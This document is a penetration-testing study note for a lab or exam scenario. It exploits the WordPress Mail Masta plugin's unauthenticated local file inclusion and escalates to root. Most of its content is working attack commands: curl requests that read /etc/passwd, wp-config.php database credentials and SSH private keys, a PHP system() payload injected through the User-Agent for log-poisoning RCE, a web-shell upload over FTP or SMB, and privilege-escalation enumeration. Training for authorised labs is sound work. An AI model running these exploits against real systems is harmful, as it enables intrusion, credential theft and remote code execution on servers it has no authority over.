# 📝 Scenario 11 — WordPress + Mail Masta plugin (LFI → foothold)

> **Given (from nmap):** Ubuntu box — `21 vsftpd 2.0.8`, `22 OpenSSH 8.2p1`, `80 Apache 2.4.41` running **WordPress 6.0.2** (*"The Stationery Warehouse"*, `/wp-admin/`) with the **Mail Masta** plugin installed, `139/445 Samba 4.6.2`. Goal: foothold → root + proof. The plugin name *is* the exploit. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]] · [[Web Enumeration]]. Foothold: [[LFI]] · [[FTP]] · [[SMB]] · [[RCE]]. Then: [[Credential Attacks]] · [[SSH]] · [[Linux Privilege Escalation]].

```bash
export IP=<TARGET_IP> ; mkdir -p loot
```

---

## 🧠 READ THE SCAN
- **WordPress core (6.0.2) is rarely the hole — a plugin is.** Here the plugin is named for you: **Mail Masta**, which has a famous **unauthenticated Local File Inclusion** (CVE-2016-10956) and SQLi (CVE-2017-6090).
- **vsftpd 2.0.8** — anon file listing is visible → test anonymous read/**write**. (Note: 2.0.8 is **not** the 2.3.4 backdoor — no magic RCE; it's a loot/upload vector.)
- **Samba 139/445** — enumerate shares for loot or a writable path.

> **Why LFI is the lever:** an unauth LFI lets you read `wp-config.php` (DB creds), `/etc/passwd` (users), and SSH keys *before* any login — and, combined with FTP/Samba write or log poisoning, it becomes **RCE**.

---

## 1️⃣ ENUMERATE
```bash
sudo nmap -sC -sV -p- $IP -oN nmap/services.txt
whatweb http://$IP/ ; wpscan --url http://$IP/ --enumerate ap,u --plugins-detection aggressive
ftp $IP            # anonymous : anonymous  → ls -la ; check read AND write (put test.txt)
nxc smb $IP -u '' -p '' --shares ; smbclient -N -L //$IP/   # readable/writable shares
```

## 2️⃣ MAIL MASTA LFI (the foothold primitive)
```bash
curl "http://$IP/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
curl "http://$IP/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd"
```
Read the high-value files:
```bash
# WordPress DB creds (the money file):
curl "http://$IP/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/var/www/html/wp-config.php"
# users + SSH keys:
.../csvexport.php?pl=/home/<user>/.ssh/id_rsa
# source via wrapper (if raw PHP renders blank):
.../csvexport.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
```
`wp-config.php` → `DB_USER` / `DB_PASSWORD` → **loot for reuse**.

## 3️⃣ TURN IT INTO ACCESS (pick what the box allows)

### A. Credential reuse (fastest)
The `wp-config` DB password is frequently the **system user's** password:
```bash
ssh <user>@$IP          # DB_PASSWORD reused; also try on FTP/SMB  ([[Credential Attacks]])
```
Found an `id_rsa` via LFI → `chmod 600 id_rsa; ssh -i id_rsa <user>@$IP`.

### B. LFI → RCE (log poisoning or FTP/SMB upload)
```bash
# log poisoning: inject PHP via User-Agent, then include the log:
curl -A '<?php system($_GET["c"]); ?>' http://$IP/
.../csvexport.php?pl=/var/log/apache2/access.log&c=id
# OR write a shell via anon FTP / a writable SMB share, then LFI-include its path:
#   ftp put shell.php  →  pl=/var/ftp/shell.php&c=id     (adjust to the real FTP root)
```
→ `www-data` shell ([[RCE]] · [[Shells]]).

### C. WordPress admin → plugin/theme editor RCE
Crack hashes from the DB (once you have a shell or DB access) → log into `/wp-admin` → **Appearance → Theme Editor** → drop PHP → RCE. ([[Web Exploitation]] · [[Hash Cracking]])

## 4️⃣ FOOTHOLD → PRIVESC (Ubuntu)
```bash
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null; cat /etc/crontab; ls -la /etc/cron.*
./linpeas.sh | tee loot/linpeas.txt
```
`sudo -l` (GTFOBins) → SUID → cron (`pspy`) → reused creds. → [[Linux Privilege Escalation]].

---

## 🗺️ DECISION FLOW
```
WordPress 6.0.2 + Mail Masta plugin
      ▼
Mail Masta LFI (count_of_send.php / csvexport.php ?pl=)
      ├─ read wp-config.php ──► DB_PASSWORD ──► reuse on SSH/FTP/SMB ──► shell ─┐
      ├─ read id_rsa ──► ssh -i ──────────────────────────────────────────────┤
      ├─ log poisoning OR FTP/SMB upload ──► include ──► www-data shell ───────┤
      └─ (shell) dump wp users ──► crack ──► wp-admin ──► theme editor RCE ─────┘
                                                              ▼
                                   privesc (sudo -l / SUID / cron) ──► ROOT ✅
```

## 🚧 STUCK?
1. LFI returns blank on PHP files → use the **`php://filter` base64** wrapper to read source.
2. Reused DB pass fails SSH → try it on **FTP/SMB** and as other users from `/etc/passwd`.
3. No log-poison RCE → check **anon FTP write** / a **writable SMB share** to drop the include target.
4. `wpscan` for **other vulnerable plugins/users** too — Mail Masta may not be the only one.
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**WordPress core is fine; the named plugin is the hole. Mail Masta = unauth LFI → read `wp-config.php` for DB creds (reuse on SSH) and `id_rsa`, or escalate the LFI to RCE via log poisoning / an FTP/SMB-dropped shell. vsftpd 2.0.8 is a loot/upload vector, not the 2.3.4 backdoor.**
